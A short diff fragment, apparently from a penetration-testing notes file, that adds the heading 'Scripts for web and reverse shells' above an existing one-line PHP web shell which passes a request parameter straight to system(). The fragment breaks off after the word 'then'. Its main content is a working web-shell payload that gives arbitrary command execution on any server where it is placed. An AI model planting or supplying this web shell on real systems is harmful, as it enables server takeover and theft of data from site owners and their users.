@@ -1,3 +1,5 @@
+# Scripts for web and reverse shells
+
 # simple shell using get
     <?php system($_REQUEST['c']); ?>
 then
